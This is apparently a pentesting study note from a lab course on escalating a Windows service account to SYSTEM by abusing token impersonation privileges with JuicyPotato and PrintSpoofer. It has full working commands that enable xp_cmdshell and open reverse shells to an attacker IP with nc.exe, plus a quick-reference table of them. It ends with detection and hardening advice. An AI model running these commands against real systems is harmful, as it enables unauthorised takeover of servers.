## Overview

In Windows, every process has an access token containing information about the account running that process.

These tokens define the process security context, including:

- User identity
- Group membership
- Assigned privileges
- Token type
- Integrity level

Two important privileges for Windows local privilege escalation are:

- `SeImpersonatePrivilege`
- `SeAssignPrimaryTokenPrivilege`

These privileges are commonly abused to escalate from a service account to:

```text
NT AUTHORITY\SYSTEM
```

---

## Why These Privileges Matter

When we gain remote code execution through a service, web application, database, or other server-side process, we often land in the context of a service account.

Common examples include:

- IIS application pool accounts
- MSSQL service accounts
- Jenkins service accounts
- Web application service accounts
- Custom Windows service accounts

These accounts may not be local administrators, but they often have powerful token-related privileges.

The most important privilege to check for is:

```text
SeImpersonatePrivilege
```

If this privilege is present, there may be a direct path to SYSTEM.

---

# Access Tokens

## What Are Access Tokens?

In Windows, access tokens are used to represent the security context of a process or thread.

A token contains information such as:

- The account running the process
- The user's groups
- The user's privileges
- The logon session
- The token type
- The integrity level

When a user authenticates, Windows creates a token for that user. Processes launched by that user inherit a copy of the token.

---

## Token Impersonation

Token impersonation allows one process to act on behalf of another user.

This is legitimate Windows functionality used by services that need to perform actions as a connecting client.

For example:

- IIS may impersonate a web client.
- SQL Server may access network resources as a user.
- A service may need to access files using a client's identity.

Attackers can abuse this behaviour if a service account has impersonation privileges.

---

# SeImpersonatePrivilege

## What Is SeImpersonatePrivilege?

`SeImpersonatePrivilege` allows a process to impersonate a client after authentication.

In practice, this means a service can temporarily act as another user after that user authenticates to it.

This privilege is commonly granted to:

- Administrators
- Local Service
- Network Service
- Service accounts

---

## Why SeImpersonatePrivilege Is Dangerous

If we control a process with `SeImpersonatePrivilege`, we may be able to trick a privileged process into connecting to us.

If that privileged process authenticates, we may be able to impersonate its token.

The goal is usually to impersonate:

```text
NT AUTHORITY\SYSTEM
```

This style of attack is commonly known as a **Potato-style privilege escalation**.

---

## Potato-Style Attacks

Potato-style attacks abuse Windows token impersonation behaviour.

The general idea is:

1. The attacker controls a process with `SeImpersonatePrivilege`.
2. The attacker starts a listener or fake service.
3. A privileged process, often SYSTEM, is coerced into authenticating to it.
4. The attacker captures or impersonates the privileged token.
5. A new process is created using the privileged token.
6. The attacker gains SYSTEM-level execution.

Common Potato-style tools include:

- JuicyPotato
- RoguePotato
- LonelyPotato
- PrintSpoofer
- GodPotato

---

# SeAssignPrimaryTokenPrivilege

## What Is SeAssignPrimaryTokenPrivilege?

`SeAssignPrimaryTokenPrivilege` allows a process to replace the primary token of a process.

This is useful because Windows processes run under a primary token. If an attacker can assign a privileged token to a new process, they may be able to execute code as that privileged user.

This privilege is less commonly seen than `SeImpersonatePrivilege`, but it can also be abused for privilege escalation.

---

## Related Windows API Calls

Token abuse often relies on Windows API functions.

Important examples include:

| API Call | Purpose |
|---|---|
| `CreateProcessWithTokenW` | Creates a new process using a specified token. Often associated with `SeImpersonatePrivilege`. |
| `CreateProcessAsUser` | Creates a process as another user. Often associated with `SeAssignPrimaryTokenPrivilege`. |

---

# Common Scenario

A common scenario is gaining code execution as a service account.

Examples:

- Uploading an ASPX web shell to IIS
- Exploiting Jenkins for command execution
- Running commands through MSSQL `xp_cmdshell`
- Exploiting a vulnerable web application
- Abusing a misconfigured Windows service

After gaining execution, immediately check privileges:

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` is listed, investigate token impersonation escalation.

---

# SeImpersonate Example — MSSQL and JuicyPotato

## Scenario

In this example, we gain access to a SQL Server using a privileged SQL user.

The SQL Server service is running under the default MSSQL service account:

```text
nt service\mssql$sqlexpress01
```

SQL Server may need to access resources as connecting clients, especially where Windows Authentication is used. For this reason, the SQL service account may have:

```text
SeImpersonatePrivilege
```

This can be abused to escalate privileges.

---

## Step 1 — Connect to MSSQL

Use `mssqlclient.py` from Impacket to connect with Windows authentication.

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Example output:

```text
Swordfish4051@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)
[!] Press help for extra shell commands
SQL>
```

---

## Step 2 — Enable xp_cmdshell

Enable `xp_cmdshell` so operating system commands can be executed through SQL Server.

```sql
enable_xp_cmdshell
```

Example output:

```text
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

Impacket handles the required `RECONFIGURE` step automatically.

---

## Step 3 — Confirm Execution Context

Run `whoami` through `xp_cmdshell`.

```sql
xp_cmdshell whoami
```

Example output:

```text
SQL> xp_cmdshell whoami

output
--------------------------------------------------------------------------------
nt service\mssql$sqlexpress01
```

This confirms commands are running as the MSSQL service account.

---

## Step 4 — Check Service Account Privileges

Check the privileges assigned to the current token.

```sql
xp_cmdshell whoami /priv
```

Example output:

```text
SQL> xp_cmdshell whoami /priv

output
--------------------------------------------------------------------------------

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Important finding:

```text
SeImpersonatePrivilege        Enabled
```

This indicates a likely privilege escalation path.

---

# Escalating with JuicyPotato

## JuicyPotato Overview

`JuicyPotato` abuses `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` using DCOM/NTLM reflection techniques.

It can attempt to create a SYSTEM process using:

- `CreateProcessWithTokenW`
- `CreateProcessAsUser`

These correspond to abuse of:

| Privilege | Relevant Function |
|---|---|
| `SeImpersonatePrivilege` | `CreateProcessWithTokenW` |
| `SeAssignPrimaryTokenPrivilege` | `CreateProcessAsUser` |

---

## Step 1 — Start a Netcat Listener

On the attacking machine, start a listener.

```bash
sudo nc -lnvp 8443
```

---

## Step 2 — Execute JuicyPotato via xp_cmdshell

Upload `JuicyPotato.exe` and `nc.exe` to the target, then run:

```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

Command breakdown:

| Option | Meaning |
|---|---|
| `-l 53375` | COM server listening port. |
| `-p c:\windows\system32\cmd.exe` | Program to launch. |
| `-a "/c ..."` | Arguments passed to `cmd.exe`. |
| `-t *` | Try both token creation methods. |

Example output:

```text
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output
--------------------------------------------------------------------------------
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375

[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
[+] calling 0x000000000088ce08
```

---

## Step 3 — Catch SYSTEM Shell

If successful, a reverse shell connects back as SYSTEM.

```text
Swordfish4051@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
WINLPE-SRV01
```

---

# JuicyPotato Limitations

`JuicyPotato` does not work reliably on newer Windows versions.

It generally does not work on:

- Windows Server 2019
- Windows 10 build 1809 and later

For newer systems, other tools may be required.

---

# PrintSpoofer and RoguePotato

## Overview

`PrintSpoofer` and `RoguePotato` can be used to abuse similar privileges on newer Windows versions where `JuicyPotato` no longer works.

Useful tools include:

| Tool | Notes |
|---|---|
| `PrintSpoofer` | Commonly used against Windows 10 and Server 2019 when `SeImpersonatePrivilege` is available. |
| `RoguePotato` | Alternative Potato-style technique for newer systems. |
| `GodPotato` | Newer Potato-style privilege escalation technique. |

---

## Escalating with PrintSpoofer

`PrintSpoofer` can be used to:

- Spawn a SYSTEM process in the current console
- Spawn a SYSTEM process on the desktop
- Execute a command as SYSTEM
- Catch a reverse shell as SYSTEM

---

## Step 1 — Start a Netcat Listener

On the attacking machine:

```bash
nc -lnvp 8443
```

---

## Step 2 — Execute PrintSpoofer via xp_cmdshell

Run `PrintSpoofer.exe` with the `-c` argument to execute a command.

```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

Example output:

```text
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output
--------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
```

---

## Step 3 — Catch SYSTEM Reverse Shell

If successful:

```text
Swordfish4051@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

---

# Choosing a Potato-Style Technique

The correct tool depends heavily on the target OS version and available privileges.

| Target / Condition | Possible Tool |
|---|---|
| Older Windows Server versions | JuicyPotato |
| Windows Server 2019 | PrintSpoofer, RoguePotato, GodPotato |
| Windows 10 build 1809+ | PrintSpoofer, RoguePotato, GodPotato |
| `SeImpersonatePrivilege` present | JuicyPotato, PrintSpoofer, RoguePotato, GodPotato |
| `SeAssignPrimaryTokenPrivilege` present | JuicyPotato or token-specific techniques |

Always confirm:

```cmd
whoami /priv
```

---

# Practical Workflow

## 1. Gain Code Execution

Common entry points include:

- Web shell
- Jenkins command execution
- MSSQL `xp_cmdshell`
- Vulnerable service
- Scheduled task abuse
- Misconfigured application

---

## 2. Confirm Current Context

```cmd
whoami
```

---

## 3. Check Privileges

```cmd
whoami /priv
```

Look for:

```text
SeImpersonatePrivilege
```

```text
SeAssignPrimaryTokenPrivilege
```

---

## 4. Identify OS Version

```cmd
systeminfo
```

Check:

- OS version
- Build number
- Server or workstation
- Patch level

---

## 5. Choose Technique

Use the OS version and privilege output to decide which approach may apply.

Examples:

- Older systems may be vulnerable to JuicyPotato.
- Newer systems may require PrintSpoofer or RoguePotato.
- Some environments may block public binaries with AV or EDR.

---

## 6. Execute and Validate

After exploitation, confirm the new security context:

```cmd
whoami
```

Expected result:

```text
nt authority\system
```

---

# Detection and Defensive Notes

## Why This Is Detectable

Potato-style privilege escalation may create suspicious behaviour such as:

- Unusual named pipe activity
- COM/DCOM activation events
- Service account spawning `cmd.exe`
- Service account spawning `powershell.exe`
- Reverse shell process trees
- Unexpected use of `nc.exe`
- Privileged token impersonation
- SYSTEM process creation from unusual parent processes

---

## Defensive Controls

Defenders can reduce risk by:

- Removing unnecessary `SeImpersonatePrivilege` assignments where possible
- Hardening service accounts
- Avoiding unnecessary service account privileges
- Monitoring service account process creation
- Monitoring named pipe abuse
- Monitoring unusual COM/DCOM activity
- Restricting or disabling `xp_cmdshell`
- Applying least privilege to SQL Server service accounts
- Keeping systems patched
- Deploying and tuning EDR controls
- Alerting on suspicious child processes from MSSQL, IIS, Jenkins, or other services

---

## Common Suspicious Process Chains

Examples of process chains defenders may investigate:

```text
sqlservr.exe -> cmd.exe
```

```text
sqlservr.exe -> powershell.exe
```

```text
w3wp.exe -> cmd.exe
```

```text
w3wp.exe -> powershell.exe
```

```text
jenkins.exe -> cmd.exe
```

```text
tomcat.exe -> cmd.exe
```

```text
service.exe -> nc.exe
```

---

# Quick Reference

| Purpose | Command |
|---|---|
| Check current user | `whoami` |
| Check privileges | `whoami /priv` |
| Check OS version | `systeminfo` |
| Connect to MSSQL | `mssqlclient.py sql_dev@<target-ip> -windows-auth` |
| Enable `xp_cmdshell` in Impacket | `enable_xp_cmdshell` |
| Confirm SQL execution context | `xp_cmdshell whoami` |
| Check SQL service account privileges | `xp_cmdshell whoami /priv` |
| Start listener | `nc -lnvp 8443` |
| JuicyPotato example | `xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <attacker-ip> 8443 -e cmd.exe" -t *` |
| PrintSpoofer example | `xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <attacker-ip> 8443 -e cmd"` |

---

# Key Takeaways

- `SeImpersonatePrivilege` is one of the most common Windows privilege escalation opportunities.
- Service accounts frequently have impersonation privileges.
- Always run `whoami /priv` after gaining code execution.
- Potato-style attacks abuse token impersonation behaviour.
- `JuicyPotato` is useful on older Windows versions.
- `JuicyPotato` does not work on Windows Server 2019 or Windows 10 build 1809 onwards.
- `PrintSpoofer` and `RoguePotato` can work on newer systems.
- MSSQL `xp_cmdshell` can provide command execution as the SQL Server service account.
- If the service account has `SeImpersonatePrivilege`, escalation to SYSTEM may be possible.
- Tool choice depends on OS version, patch level, available privileges, and security controls.

---

## Summary

`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` are powerful Windows privileges that can often be abused to escalate from a service account to SYSTEM.

The basic workflow is:

1. Gain code execution as a service account.
2. Run `whoami /priv`.
3. Identify `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
4. Check the OS version.
5. Choose a suitable Potato-style technique.
6. Execute and validate SYSTEM access.

These privileges are especially important after gaining access through IIS, MSSQL, Jenkins, or any other service-backed application.

---

## Tags

#Windows #PrivilegeEscalation #WindowsPrivilegeEscalation #SeImpersonatePrivilege #SeAssignPrimaryTokenPrivilege #AccessTokens #TokenImpersonation #JuicyPotato #PrintSpoofer #RoguePotato #GodPotato #MSSQL #xp_cmdshell #ServiceAccounts #HTB #Pentesting #OSCP